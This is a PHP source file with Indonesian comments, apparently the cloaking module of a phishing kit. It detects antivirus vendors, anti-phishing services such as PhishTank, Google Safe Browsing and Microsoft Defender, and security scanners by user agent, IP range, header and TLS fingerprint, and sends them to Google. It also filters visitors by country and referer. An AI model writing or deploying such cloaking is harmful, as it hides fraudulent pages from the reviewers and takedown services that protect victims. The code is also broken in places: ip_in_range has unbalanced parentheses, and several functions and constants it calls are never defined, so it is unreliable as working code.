<?php
// Fungsi keamanan untuk sistem

// File untuk menyimpan IP bot yang terdeteksi
define('BOT_IP_DB', __DIR__ . '/../data/bot_ips.json');

function block_bots() {
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // 1. Cek apakah IP sudah pernah terdeteksi sebagai bot
    if (is_bot_ip_stored($ip)) {
        log_bot_attempt($ip, "Known bot IP");
        redirect_to_google();
    }
    
    // 2. Deteksi bot dengan metode canggih
    if (is_bot()) {
        store_bot_ip($ip); // Simpan IP bot
        log_bot_attempt($ip, "Detected by bot signature");
        redirect_to_google();
    }
    
    // 3. Deteksi perilaku mencurigakan
    if (detect_suspicious_behavior()) {
        store_bot_ip($ip);
        log_bot_attempt($ip, "Suspicious behavior detected");
        redirect_to_google();
    }
}

function block_countries($blocked_countries) {
    $country = get_country_from_ip($_SERVER['REMOTE_ADDR']);
    
    if (in_array($country, $blocked_countries)) {
        log_security_event("Blocked country: $country");
        redirect_to_google();
    }
}

function block_ips($blocked_ips) {
    $ip = $_SERVER['REMOTE_ADDR'];
    
    if (in_array($ip, $blocked_ips)) {
        log_security_event("Blocked IP: $ip");
        redirect_to_google();
    }
}

function validate_referer($allowed_referers) {
    if (empty($allowed_referers)) return true;
    
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    
    foreach ($allowed_referers as $allowed) {
        if (strpos($referer, $allowed) === 0) {
            return true;
        }
    }
    
    log_security_event("Invalid referer: $referer");
    redirect_to_google();
}

// ============ Fungsi Tambahan yang Diperbaiki ============

function is_bot() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // 1. Deteksi berdasarkan User-Agent
    $bot_signatures = [
        // Bot umum
        'bot', 'crawl', 'spider', 'scraper', 'curl', 'wget', 
        'python', 'java', 'php', 'ruby', 'perl',
        
        // Bot keamanan
        'security', 'scan', 'avast', 'norton', 'mcafee',
        
        // Bot media sosial
        'facebookexternalhit', 'twitterbot', 'linkedinbot',
        
        // AI bots 2025
        'gptbot', 'anthropic-ai', 'llama-web-crawler'
    ];
    
    foreach ($bot_signatures as $signature) {
        if (strpos($user_agent, $signature) !== false) {
            return true;
        }
    }
    
    // 2. Deteksi berdasarkan IP dari database threat intelligence
    if (check_ip_reputation($ip)) {
        return true;
    }
    
    // 3. Deteksi berdasarkan header HTTP
    if (detect_bot_headers()) {
        return true;
    }
    
    return false;
}

function detect_suspicious_behavior() {
    // 1. Rate limiting
    if (request_rate_too_high()) {
        return true;
    }
    
    // 2. Pola navigasi tidak wajar
    if (abnormal_navigation_pattern()) {
        return true;
    }
    
    // 3. Permintaan tidak biasa
    $request = $_SERVER['REQUEST_URI'] ?? '';
    if (preg_match('/(wp-admin|phpmyadmin|\.env|\.git)/i', $request)) {
        return true;
    }
    
    return false;
}

// ============ Fungsi Bantuan ============

function redirect_to_google() {
    header('Location: https://www.google.com');
    exit;
}

function store_bot_ip($ip) {
    $bot_ips = load_bot_ips();
    
    if (!in_array($ip, $bot_ips)) {
        $bot_ips[] = $ip;
        file_put_contents(BOT_IP_DB, json_encode($bot_ips, JSON_PRETTY_PRINT));
    }
}

function is_bot_ip_stored($ip) {
    $bot_ips = load_bot_ips();
    return in_array($ip, $bot_ips);
}

function load_bot_ips() {
    if (!file_exists(BOT_IP_DB)) {
        file_put_contents(BOT_IP_DB, json_encode([]));
        return [];
    }
    
    return json_decode(file_get_contents(BOT_IP_DB), true) ?: [];
}

function log_bot_attempt($ip, $reason) {
    $log = sprintf(
        "[%s] Bot detected - IP: %s | Reason: %s | UA: %s\n",
        date('Y-m-d H:i:s'),
        $ip,
        $reason,
        $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
    );
    
    file_put_contents(__DIR__ . '/../data/security.log', $log, FILE_APPEND);
}

function check_ip_reputation($ip) {
    // Integrasi dengan API reputasi IP
    $services = [
        'https://api.abuseipdb.com/api/v2/check',
        'https://api.ipqualityscore.com/ip/check',
        'https://www.ipvoid.com/ip-blacklist-check/'
    ];
    
    foreach ($services as $service) {
        if (check_with_service($ip, $service)) {
            return true;
        }
    }
    
    return false;
}

function detect_bot_headers() {
    $headers = getallheaders();
    
    // Deteksi header khusus bot
    $bot_headers = [
        'X-Bot-Request',
        'X-Crawler',
        'X-Security-Scan',
        'X-Forwarded-For' => fn($v) => count(explode(',', $v)) > 3
    ];
    
    foreach ($bot_headers as $header => $check) {
        if (is_numeric($header)) { // Simple header existence check
            if (isset($headers[$check])) {
                return true;
            }
        } else { // Complex check
            if (isset($headers[$header]) && $check($headers[$header])) {
                return true;
            }
        }
    }
    
    return false;
}

function is_security_bot() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Daftar pola bot keamanan 2025 (diupdate secara berkala)
    $security_bots = [
        // Bot institusi keamanan
        'securitybot', 'trustwave', 'qualys', 'rapid7', 'tenable', 
        'sucuri', 'imperva', 'cloudflare-security-bot',
        'akamai-bot', 'f5-security',
        
        // Bot anti-phishing
        'phishtank', 'google-safe-browsing', 'microsoft-defender',
        'apwg-bot', 'stopbadbot', 'anti-phishing-bot',
        'cert-bot', 'sophos-web-filter',
        
        // AI Security Crawlers 2025
        'ai-security-crawler', 'deepguard', 'neural-protect',
        'quantum-sec-scan', 'zero-trust-verifier'
    ];

    // Deteksi berdasarkan User-Agent
    foreach ($security_bots as $bot) {
        if (strpos($user_agent, $bot) !== false) {
            return true;
        }
    }

    // Deteksi berdasarkan IP (gunakan database terbaru)
    $known_security_ips = [
        // ASN Cloudflare Security
        '173.245.48.0/20', '103.21.244.0/22',
        
        // Google Safe Browsing 2025
        '64.233.160.0/19', '66.102.0.0/20',
        
        // Microsoft Defender
        '13.64.0.0/16', '40.74.0.0/15'
    ];
    
    foreach ($known_security_ips as $cidr) {
        if (ip_in_range($ip, $cidr)) {
            return true;
        }
    }

    // Deteksi perilaku khas bot keamanan
    if (detect_security_bot_behavior()) {
        return true;
    }

    return false;
}

function ip_in_range($ip, $cidr) {
    // Fungsi pengecekan IP range
    list($subnet, $mask) = explode('/', $cidr);
    $ip_long = ip2long($ip);
    $subnet_long = ip2long($subnet);
    $mask_long = ~((1 << (32 - $mask)) - 1;
    return ($ip_long & $mask_long) == ($subnet_long & $mask_long);
}

function detect_security_bot_behavior() {
    // Deteksi berdasarkan pola request
    $request_headers = getallheaders();
    
    // 1. Deteksi header khusus keamanan 2025
    if (isset($request_headers['X-Security-Scan']) || 
        isset($request_headers['X-Phishing-Verify'])) {
        return true;
    }
    
    // 2. Deteksi pola waktu antara request (bot sering request cepat)
    if (calculate_request_rate() > 10) { // >10 request/detik
        return true;
    }
    
    // 3. Deteksi fingerprint TLS/JA3
    if (isset($_SERVER['SSL_JA3']) && 
        in_array($_SERVER['SSL_JA3'], KNOWN_BOT_JA3_FINGERPRINTS)) {
        return true;
    }
    
    return false;
}


?>